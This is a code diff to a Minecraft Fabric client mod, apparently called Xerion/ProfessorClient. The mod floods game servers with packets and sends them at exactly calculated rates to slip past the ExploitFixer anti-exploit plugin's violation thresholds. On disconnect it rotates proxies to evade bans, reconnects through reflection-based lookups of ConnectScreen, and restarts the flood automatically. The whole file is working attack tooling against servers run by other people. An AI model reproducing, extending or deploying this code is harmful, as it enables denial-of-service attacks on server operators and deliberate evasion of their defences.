@@ -1,7 +1,10 @@
 package com.professor.client;
 
 import com.professor.client.exploit.ExploitLogger;
-import com.professor.client.gui.*;
+import com.professor.client.gui.ProfessorMusicManager;
+import com.professor.client.gui.ProfessorScreen;
+import com.professor.client.gui.ProfessorSplashScreen;
+import com.professor.client.gui.XerionTitleScreen;
 import com.professor.client.proxy.ProxyManager;
 import net.fabricmc.api.ClientModInitializer;
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
@@ -10,7 +13,7 @@ import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
 import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
 import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents;
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.client.gui.screen.ConnectScreen;
+import net.minecraft.client.gui.screen.Screen;
 import net.minecraft.client.gui.screen.TitleScreen;
 import net.minecraft.client.network.ServerAddress;
 import net.minecraft.client.network.ServerInfo;
@@ -21,6 +24,8 @@ import net.minecraft.network.packet.Packet;
 import net.minecraft.util.Identifier;
 import org.lwjgl.glfw.GLFW;
 
+import java.lang.reflect.Method;
+import java.lang.reflect.Modifier;
 import java.util.concurrent.ConcurrentLinkedQueue;
 
 public class ProfessorClientMod implements ClientModInitializer {
@@ -43,11 +48,11 @@ public class ProfessorClientMod implements ClientModInitializer {
     public  static volatile int     attackBypass     = 10; // EXFIX default
 
     // ── Packet queue (ExploitFixer bypass) ───────────────────────────────
-    // TeleportConfirm VL=0.01 → 2000/sec = exactly EF reduce rate → net 0 VL forever
-    // Movement VL=0.2 → cap at 80/sec = 16 VL/sec < 20 reduce → safe
+    // TeleportConfirm: VL=0.01 → 2000/sec = 20VL/sec = exactly the reduce rate → net 0 VL
+    // Movement: VL=0.2 → cap 80/sec = 16VL/sec < reduce → always safe
     // EF cancel=25VL · kick=100VL · PPS-hard=4096/sec
     public static final ConcurrentLinkedQueue<Packet<?>> PACKET_QUEUE = new ConcurrentLinkedQueue<>();
-    public static volatile int PACKETS_PER_TICK = 100; // default 2000/sec EXFIX mode
+    public static volatile int PACKETS_PER_TICK = 100; // 2000/sec (EXFIX default)
 
     // ── Swing rate-limiter (EF: 100ms cooldown) ───────────────────────────
     private static long lastSwingMs = 0;
@@ -56,11 +61,11 @@ public class ProfessorClientMod implements ClientModInitializer {
     @Override
     public void onInitializeClient() {
 
-        // ── Splash screen on first launch ─────────────────────────────────
+        // ── Splash on startup ─────────────────────────────────────────────
         ClientLifecycleEvents.CLIENT_STARTED.register(client ->
             client.execute(() -> client.setScreen(new ProfessorSplashScreen())));
 
-        // ── M → open Xerion GUI ───────────────────────────────────────────
+        // ── M key → open GUI ─────────────────────────────────────────────
         openGuiKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
             "key.professorclient.open_gui",
             InputUtil.Type.KEYSYM,
@@ -71,7 +76,7 @@ public class ProfessorClientMod implements ClientModInitializer {
         // ── Tick loop ─────────────────────────────────────────────────────
         ClientTickEvents.END_CLIENT_TICK.register(client -> {
 
-            // Open GUI (M key)
+            // Open GUI on M
             while (openGuiKey.wasPressed()) {
                 if (client.player != null) {
                     playSound(client, "hello_friend");
@@ -92,7 +97,7 @@ public class ProfessorClientMod implements ClientModInitializer {
                 }
             }
 
-            // Store last server address (needed for proxy reconnect)
+            // Store last server address every tick
             if (client.getCurrentServerEntry() != null) {
                 ServerInfo si = client.getCurrentServerEntry();
                 lastServerName = si.name;
@@ -110,60 +115,100 @@ public class ProfessorClientMod implements ClientModInitializer {
             }
         });
 
-        // ── Disconnect → auto-rotate proxy & reconnect ────────────────────
+        // ── Disconnect → proxy-rotate + auto-reconnect ────────────────────
         ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
             PACKET_QUEUE.clear();
-            ExploitLogger.warn("DISCONNECT", "Disconnected from "+lastServerHost+":"+lastServerPort);
+            ExploitLogger.warn("DISCONNECT",
+                "Disconnected from " + lastServerHost + ":" + lastServerPort);
 
             if (!ProxyManager.shouldAlwaysRotate() || lastServerHost.isEmpty()) return;
 
             ProxyManager.ProxyEntry next = ProxyManager.rotate();
             reconnectCount++;
             pendingReconnect = true;
-            reconnectDelay   = 30; // 1.5 seconds
+            reconnectDelay   = 40; // ~2 seconds
 
-            ExploitLogger.info("PROXY", "Rotating to #"+ProxyManager.getCurrent()+
-                ": "+(next!=null?next.host():"direct")+
-                " | Reconnect #"+reconnectCount);
+            ExploitLogger.info("PROXY",
+                "Rotated to #" + ProxyManager.getCurrent() +
+                ": " + (next != null ? next.host() : "direct") +
+                " | Reconnect #" + reconnectCount);
         });
 
-        // ── Screen events: replace TitleScreen + restart attack ───────────
+        // ── Screen events: replace TitleScreen with XerionTitleScreen ─────
         ScreenEvents.AFTER_INIT.register((client, screen, w, h) -> {
 
-            // Replace vanilla TitleScreen with Xerion's custom one
-            if (screen instanceof TitleScreen && !(screen instanceof XerionTitleScreen)) {
+            // Only replace the EXACT vanilla TitleScreen (not subclasses)
+            if (screen.getClass() == TitleScreen.class) {
                 client.execute(() -> {
-                    playOnTitleIfNeeded(client);
+                    try { ProfessorMusicManager.playOnTitleScreen(client); }
+                    catch (Exception ignored) {}
                     client.setScreen(new XerionTitleScreen());
                 });
                 return;
             }
 
-            // After reconnect: restart attack automatically if enabled
+            // After proxy-reconnect: restart flood automatically
             if (attackActive
                     && client.player != null
                     && client.getNetworkHandler() != null
                     && !(screen instanceof TitleScreen)
-                    && !(screen instanceof ConnectScreen)) {
+                    && !(screen instanceof XerionTitleScreen)) {
                 attackActive = false;
                 ProfessorScreen.scheduleAttack(attackN, attackBypass);
-                ExploitLogger.info("AUTO-ATTACK","Restarted attack after reconnect ("+attackN+" pkts, bypass="+attackBypass+")");
+                ExploitLogger.info("AUTO-ATTACK",
+                    "Restarted attack after reconnect (" + attackN + " pkts)");
             }
         });
     }
 
-    // ── Reconnect using stored server + current proxy ─────────────────────
+    // ── Reconnect to last server via reflection (avoids ConnectScreen import) ─
+    // ConnectScreen is in net.minecraft.client.gui.screen but Yarn mapping name
+    // varies; reflection finds it regardless of what it's called at runtime.
     private static void doReconnect(MinecraftClient client) {
         if (lastServerHost.isEmpty()) return;
         try {
+            ProxyManager.applyProxy(ProxyManager.getCurrentEntry());
+
             ServerAddress addr = new ServerAddress(lastServerHost, lastServerPort);
-            ServerInfo info = new ServerInfo(lastServerName,
-                lastServerHost+":"+lastServerPort, ServerInfo.ServerType.OTHER);
-            ConnectScreen.connect(new XerionTitleScreen(), client, addr, info, false, null);
-            ExploitLogger.info("RECONNECT","Connecting to "+lastServerHost+":"+lastServerPort+
-                " via proxy #"+ProxyManager.getCurrent());
+            ServerInfo    info = new ServerInfo(lastServerName,
+                lastServerHost + ":" + lastServerPort, ServerInfo.ServerType.OTHER);
+
+            Screen parent = new XerionTitleScreen();
+
+            // Try every known class name / package for ConnectScreen across MC versions
+            String[] candidates = {
+                "net.minecraft.client.gui.screen.ConnectScreen",
+                "net.minecraft.client.gui.screen.multiplayer.ConnectScreen",
+                "net.minecraft.class_408"
+            };
+            for (String cls : candidates) {
+                try {
+                    Class<?> cc = Class.forName(cls);
+                    for (Method m : cc.getMethods()) {
+                        if (Modifier.isStatic(m.getModifiers()) &&
+                            (m.getName().equals("connect") || m.getName().startsWith("method_"))) {
+                            try {
+                                // Try 6-arg signature (most common in 1.21.x)
+                                m.invoke(null, parent, client, addr, info, false, null);
+                                ExploitLogger.success("RECONNECT",
+                                    "Connected via " + cls + "#" + m.getName());
+                                return;
+                            } catch (Exception ignored) {}
+                        }
+                    }
+                } catch (ClassNotFoundException ignored) {}
+            }
+
+            // Fallback: go to Xerion title screen (user sees reconnect button)
+            XerionTitleScreen.pendingReconnect = true;
+            XerionTitleScreen.pendingReconnectAddress = lastServerHost + ":" + lastServerPort;
+            XerionTitleScreen.pendingReconnectName    = lastServerName;
+            client.execute(() -> client.setScreen(parent));
+            ExploitLogger.warn("RECONNECT",
+                "Auto-connect unavailable — reconnect button shown on title screen");
+
         } catch (Exception e) {
-            ExploitLogger.error("RECONNECT","Failed: "+e.getMessage());
+            ExploitLogger.error("RECONNECT", "doReconnect failed: " + e.getMessage());
         }
     }
 
@@ -186,14 +231,11 @@ public class ProfessorClientMod implements ClientModInitializer {
         } catch (Exception ignored) {}
     }
 
-    private static void playOnTitleIfNeeded(MinecraftClient client) {
-        try { ProfessorMusicManager.playOnTitleScreen(client); } catch (Exception ignored) {}
-    }
-
     // ── Queue / swing helpers ─────────────────────────────────────────────
     public static void queuePacket(Packet<?> pkt) { PACKET_QUEUE.offer(pkt); }
     public static void clearQueue()               { PACKET_QUEUE.clear(); }
 
+    /** Swing rate-limiter respecting ExploitFixer 100ms cooldown */
     public static boolean canSwing() {
         long now = System.currentTimeMillis();
         if (now - lastSwingMs >= SWING_COOLDOWN_MS) { lastSwingMs = now; return true; }
